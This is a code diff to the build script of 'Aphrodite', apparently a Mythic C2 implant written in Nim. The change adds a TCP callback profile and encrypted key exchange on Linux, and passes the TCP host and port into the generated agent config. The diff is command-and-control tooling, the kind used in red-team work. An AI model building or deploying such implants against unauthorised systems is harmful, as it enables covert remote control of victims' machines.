@@ -26,7 +26,7 @@ Supports Linux (native) and Windows (cross-compiled via mingw-w64).
 NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
 """
     supports_dynamic_loading = False
-    c2_profiles = ["http"]
+    c2_profiles = ["http", "tcp"]
     build_parameters = [
         BuildParameter(
             name="target_os",
@@ -86,8 +86,8 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
             c2 = self.c2info[0]
             profile = c2.get_c2profile()
             profile_name = profile.get("name", "")
-            if profile_name != "http":
-                build_stderr += f"Aphrodite supports only the http C2 profile. Got: {profile_name}\n"
+            if profile_name not in ("http", "tcp"):
+                build_stderr += f"Aphrodite supports http and tcp C2 profiles. Got: {profile_name}\n"
                 return BuildResponse(
                     status=BuildStatus.Error,
                     build_stdout=build_stdout,
@@ -170,17 +170,12 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
                 build_stderr += (
                     "WARNING: PSK mode selected but AESPSK is empty or 'none'.\n"
                     "Agent will run in plaintext mode (no encryption).\n"
-                    "Make sure the Mythic HTTP profile also has no encryption configured.\n"
                 )
 
-            if not use_psk:
-                build_stderr += (
-                    "WARNING: EKE (Encrypted Key Exchange) is not yet supported in Aphrodite.\n"
-                    "Please uncheck 'Encrypted Key Exchange' in the HTTP profile settings.\n"
-                    "The agent will attempt to use PSK mode.\n"
-                )
+            # EKE is supported for Linux; Windows falls back to PSK
+            use_eke = not use_psk
 
-            # --- Build base URL ---
+            # --- Build base URL (HTTP) ---
             if "://" not in callback_host:
                 callback_host = "http://" + callback_host
             host_part = callback_host.split("://")[1]
@@ -189,6 +184,12 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
             else:
                 base_url = f"{callback_host.rstrip('/')}:{callback_port}"
 
+            # --- TCP host (stripped of scheme/path/port) ---
+            import re
+            tcp_host = re.sub(r'^https?://', '', callback_host)
+            tcp_host = tcp_host.split('/')[0].split(':')[0]
+            tcp_port = callback_port
+
             # --- Build parameters ---
             target_os = self.get_parameter("target_os") or "linux"
             architecture = self.get_parameter("architecture") or "amd64"
@@ -196,7 +197,10 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
 
             build_stdout += f"[+] Step 1: Gathering files...\n"
             build_stdout += f"[*] Target: {target_os}/{architecture} | debug={debug}\n"
-            build_stdout += f"[*] C2: {base_url}{post_uri} | interval={interval}s jitter={jitter}%\n"
+            if profile_name == "tcp":
+                build_stdout += f"[*] C2 (TCP): {tcp_host}:{tcp_port} | interval={interval}s jitter={jitter}%\n"
+            else:
+                build_stdout += f"[*] C2 (HTTP): {base_url}{post_uri} | interval={interval}s jitter={jitter}%\n"
 
             tmpdir = tempfile.mkdtemp(prefix="aphrodite_build_")
             try:
@@ -210,6 +214,8 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
                     uuid=self.uuid,
                     base_url=base_url,
                     post_uri=post_uri,
+                    tcp_host=tcp_host,
+                    tcp_port=tcp_port,
                     interval=interval,
                     jitter=jitter,
                     killdate=killdate,
@@ -263,6 +269,28 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
                 else:
                     nim_flags.append("-d:release")
                     nim_flags.append("-d:strip")
+
+                # TCP C2 profile
+                if profile_name == "tcp":
+                    nim_flags.append("-d:c2ProfileTcp")
+
+                # EKE (Linux only — Windows cross-compile lacks OpenSSL)
+                if use_eke:
+                    if target_os == "linux":
+                        nim_flags += [
+                            "-d:useEke",
+                            "--passL:-Wl,-Bstatic",
+                            "--passL:-lssl",
+                            "--passL:-lcrypto",
+                            "--passL:-Wl,-Bdynamic",
+                            "--passL:-ldl",
+                            "--passL:-lpthread",
+                        ]
+                        build_stdout += "[*] EKE enabled (RSA-4096 staging, OpenSSL statically linked)\n"
+                    else:
+                        build_stderr += (
+                            "WARNING: EKE not supported for Windows target — using PSK mode.\n"
+                        )
 
                 if target_os == "windows":
                     nim_flags += ["--os:windows", "--cpu:amd64", "-d:mingw"]
@@ -340,8 +368,8 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
             )
 
     def _generate_config_nim(
-        self, uuid, base_url, post_uri, interval, jitter,
-        killdate, user_agent, aes_psk, use_psk, debug
+        self, uuid, base_url, post_uri, tcp_host, tcp_port,
+        interval, jitter, killdate, user_agent, aes_psk, use_psk, debug
     ) -> str:
         # Escape backslashes and quotes for Nim string literals
         def nim_str(s):
@@ -352,6 +380,8 @@ const
   AgentUUID* = "{nim_str(uuid)}"
   C2BaseUrl* = "{nim_str(base_url)}"
   C2Endpoint* = "{nim_str(post_uri)}"
+  TcpHost* = "{nim_str(tcp_host)}"
+  TcpPort* = {tcp_port}
   SleepInterval* = {interval}
   JitterPercent* = {jitter}
   KillDate* = "{nim_str(killdate)}"
